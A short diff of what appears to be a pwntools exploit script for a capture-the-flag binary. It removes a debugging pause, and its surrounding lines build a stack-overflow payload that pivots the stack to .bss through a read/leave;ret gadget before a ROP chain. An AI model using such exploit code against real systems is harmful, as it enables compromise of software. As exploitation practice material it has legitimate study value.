@@ -21,14 +21,11 @@ puts_plt = e.plt["puts"]
 
 p.recvuntil("payload!!\n")
 
-input()
-
 pay = b""
 pay += b"A" * 0x28
 pay += p32(bss + 0x200) # sfp
 pay += p32(read_leave_ret)
 p.send(pay)
-
 
 # rop start
 pay = b""
